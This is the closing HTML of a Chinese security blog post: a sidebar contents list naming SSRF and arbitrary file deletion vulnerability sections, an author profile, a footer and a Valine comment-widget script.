href="#SSRF-%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.</span> <span class="nav-text">SSRF 漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.5.</span> <span class="nav-text">任意文件删除漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="landvsec" src="/images/landv.jpg"><p class="site-author-name" itemprop="name">landvsec</p><div class="site-description" itemprop="description">困于山中，被鬼追逐。</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">10</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">4</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">10</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/landvsec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;landvsec" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i></a> </span><span class="links-of-author-item"><a href="mailto:landv.sec@outlook.com" title="E-Mail → mailto:landv.sec@outlook.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a> </span><span class="links-of-author-item"><a href="https://twitter.com/landvsec" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;landvsec" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></span></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2020</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">landvsec</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-area-chart"></i> </span><span title="站点总字数">84k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">1:17</span></div><div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Gemini</a> v7.7.2</div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '0yViUOGA7HtJMAXySVB4izzL-gzGzoHsz',
      appKey     : 'j8ykiSEAw39cFwbk9Hrh2hQP',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});</script></body></html>